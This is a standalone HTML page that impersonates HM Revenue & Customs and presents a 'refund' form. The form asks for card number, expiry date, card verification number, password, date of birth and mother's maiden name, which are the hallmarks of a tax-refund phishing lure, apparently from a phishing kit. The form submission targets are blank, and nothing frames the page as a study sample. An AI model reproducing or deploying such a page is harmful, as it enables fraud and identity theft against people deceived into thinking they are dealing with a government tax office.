
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HM Revenue & Customs</title>
</head>

<body>
    <center>
        
        <br>
        <p>Address Information - Please enter your name and address as you have it listed for your credit card.</p>
        <form action="">
            <table style="border-spacing: 5px;">
                <tr>
                    <td align="right"><label for="cname">CardHolder Name :</label></td>
                    <td><input id="cname" type="text" style="width: 100%;"></td>
                </tr>
                <tr>
                    <td align="right"><label for="dob">Date of Birth :</label></td>
                    <td><input id="dob" type="date"></td>
                </tr>
                <tr>
                    <td align="right"><label for="mmname">Mother Maiden Name :</label></td>
                    <td><input id="mmname" type="text" style="width: 100%;"></td>
                </tr>
                <tr>
                    <td align="right"><label for="address">Address :</label></td>
                    <td><textarea name="" id="address" cols="30" rows="2" style="width: 100%;"></textarea></td>
                </tr>
                <tr>
                    <td align="right"><label for="twncty">Town/City :</label></td>
                    <td><input id="twncty" type="text" style="width: 100%;"></td>
                </tr>
                <tr>
                    <td align="right"><label for="prncergn">Province/Region :</label></td>
                    <td><input id="prncergn" type="text" style="width: 100%;"></td>
                </tr>
                <tr>
                    <td align="right"><label for="postalcode">Postal Code :</label></td>
                    <td><input id="postalcode" type="number"></td>
                </tr>
                <tr>
                    <td align="right"><label for="phnumber">Phone Number :</label></td>
                    <td><input id="phnumber" type="number" style="width: 100%;"></td>
                </tr>
            </table>
        </form>
        <p>Credit Card Information - Please enter your Credit or Debit Card where refunds will be made.</p>
        <form action="">
            <table style="border-spacing: 5px;">
                <tr>
                    <td align="right"><label for="bname">Bank Name :</label></td>
                    <td><input id="bname" type="text" style="width: 100%;"></td>
                </tr>
                <tr>
                    <td align="right"><label for="cdnumber">Debit / Credit Card Number :</label></td>
                    <td><input id="cdnumber" type="number" style="width: 100%;"></td>
                </tr>
                <tr>
                    <td align="right"><label for="exdate">Expiration Date :</label></td>
                    <td><input id="exdate" type="date"></td>
                </tr>
                <tr>
                    <td align="right"><label for="ccnumber">Card Verificcation Number :</label></td>
                    <td><input id="ccnumber" type="number"></td>
                </tr>
                <tr>
                    <td align="right"><label for="psw">Password :</label></td>
                    <td><input id="psw" type="password" style="width: 100%;"></td>
                </tr>
                <tr>
                    <td style="text-align: center;" colspan="2"><br><input type="submit" value="Submit Information">
                    </td>
                </tr>
            </table>
        </form>
    </center>
</body>

</html>
